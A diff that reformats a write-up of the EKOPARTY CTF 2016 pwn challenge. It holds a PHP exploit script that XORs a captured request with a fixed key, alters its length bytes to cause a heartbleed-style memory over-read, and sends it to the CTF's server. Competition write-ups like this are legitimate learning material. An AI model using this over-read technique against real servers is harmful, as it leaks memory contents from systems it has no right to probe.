@@ -1,6 +1,7 @@
 # EKOPARTY CTF 2016 - WRITEUP
 
 Author: Juan Escobar
+
 Date: 28 - 10 - 16
 
 ## Misc 50
@@ -109,12 +110,11 @@ Flag
 The challenge was solved intercepting the traffic with Wireshark and replicating the request with a modification in 4 to 7 bytes to exploit the heartbleed and XOR operation with the key '0xdeadbeefcafebabe' in request content.
 
 Exploit
-´´´php
+
+```php
 <?php
 error_reporting(E_ALL);
-
 $key = "de ad be ef ca fe ba be";
-
 $akey = explode(" ", $key);
 $file = file_get_contents("req.hex");
 $ahex = explode(" ", $file);
@@ -138,7 +138,6 @@ for ($i=0; $i < count($vector); $i++) {
 	$payload .= bin2hex(chr(hexdec($vector[$i]) ^ hexdec($akey[$i % 8])));
 }
 
-
 $service_port = 50000;
 $address = "4ff0eff1d46c1d74d152aaf36de6f2799020bdbc.ctf.site";
 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
@@ -147,7 +146,6 @@ if ($socket === false) {
 }
 
 echo "Intentando conectar a '$address' en el puerto '$service_port'...\n";
-
 echo "Length...\n";
 echo $vector[4] . "\n";
 echo $vector[5] . "\n";
@@ -158,7 +156,6 @@ $result = socket_connect($socket, $address, $service_port);
 if ($result === false) {
     echo "socket_connect() falló.\nRazón: ($result) " . socket_strerror(socket_last_error($socket)) . "\n";
 }
-
 
 echo "Comparando penticiones..\n";
 echo "file: " . str_replace(" ", "", $file) . "\n";
@@ -178,7 +175,7 @@ while ($out = socket_read($socket, 2048)) {
 echo "\n\nCerrando socket...";
 socket_close($socket);
 echo "OK.\n\n";
-´´´
+```
 
 ![](img/pwn50/flag.png)
 
@@ -188,4 +185,3 @@ Flag
 Ranking 255 of 721.
 
 ![](img/scoreboard.png)
-
